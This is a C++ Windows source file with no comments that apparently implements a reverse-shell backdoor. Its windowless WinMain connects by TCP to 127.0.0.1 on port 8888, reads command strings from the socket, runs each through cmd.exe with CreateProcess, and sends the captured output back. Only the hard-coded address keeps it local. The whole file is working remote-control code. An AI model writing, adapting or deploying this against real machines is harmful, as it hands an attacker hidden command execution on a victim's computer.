#define _WINSOCK_DEPRECATED_NO_WARNINGS 1

#include <iostream>
#include <winsock2.h>

#pragma comment(lib, "ws2_32.lib")

using namespace std;

std::string exec(char* cmd)
{
	HANDLE hStdOutPipeRead = NULL;
	HANDLE hStdOutPipeWrite = NULL;
	SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
	if (!CreatePipe(&hStdOutPipeRead, &hStdOutPipeWrite, &sa, 0))
	{
		return "Create pipe error";
	}
	STARTUPINFO si = {};
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.hStdError = hStdOutPipeWrite;
	si.hStdOutput = hStdOutPipeWrite;
	PROCESS_INFORMATION pi = {};
	LPCSTR lpApplicationName = "C:\\Windows\\System32\\cmd.exe";
	char lpCommandLine[1024];
	sprintf_s(lpCommandLine, "%s%s%s", lpApplicationName, " /c ", cmd);
	std::cout << lpCommandLine << std::endl;
	if (!CreateProcess(lpApplicationName, lpCommandLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
		return "Create process error";
	}
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	CloseHandle(hStdOutPipeWrite);
	char buf[1024 + 1] = {};
	DWORD dwRead = 0;
	DWORD dwAvail = 0;
	std::string result; {}
	BOOL ok = ReadFile(hStdOutPipeRead, buf, 1024, &dwRead, NULL);
	while (ok)
	{
		buf[dwRead] = '\0';
		result += buf;
		ok = ReadFile(hStdOutPipeRead, buf, 1024, &dwRead, NULL);
	}
	CloseHandle(hStdOutPipeRead);
	return result;
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	SOCKET hClntSock = socket(PF_INET, SOCK_STREAM, 0);
	SOCKADDR_IN servAddr;
	servAddr.sin_family = AF_INET;
	servAddr.sin_addr.s_addr = inet_addr("127.0.0.1");
	servAddr.sin_port = htons(8888);
	connect(hClntSock, (SOCKADDR*)&servAddr, sizeof(servAddr));
	while (1)
	{
		char cmd[1024];
		int nReadBytes;
		nReadBytes = recv(hClntSock, cmd, 1024, 0);
		if (nReadBytes == SOCKET_ERROR)
		{
			break;
		}
		std::string result = exec(cmd);
		int len = result.size();
		send(hClntSock, (char*)&len, sizeof(int), 0);
		send(hClntSock, result.c_str(), len, 0);
	}
	WSACleanup();
	return 0;
}